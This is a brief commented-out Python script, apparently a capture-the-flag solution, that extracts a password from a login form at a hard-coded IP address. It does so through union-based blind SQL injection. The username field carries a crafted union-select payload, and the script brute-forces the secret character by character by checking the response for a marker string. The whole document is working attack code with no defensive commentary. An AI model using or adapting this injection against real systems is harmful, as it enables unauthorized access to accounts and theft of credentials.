# import requests
# import binascii
#
# def getPassword():
#     url = "http://39.100.83.188:8054/"
#     username = "union_373_Tom' union select binary 1,2,0x{} order by 3,'0"
#     flag = ""
#     for _ in range(32):
#         for i in range(32, 127):
#             headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Union.373"}
#             data = {"username": username.format(binascii.hexlify((flag + chr(i)).encode('utf-8')).decode()), "password": '1'}
#             res = requests.post(url, data=data, headers=headers)
#             print(data['username'])
#             res.encoding = 'utf-8'
#             if "union_373_Tom" in res.text:
#                 flag = flag + chr(i - 1)
#                 print(flag)
#                 break
#
#
# if __name__ == '__main__':
#     getPassword()
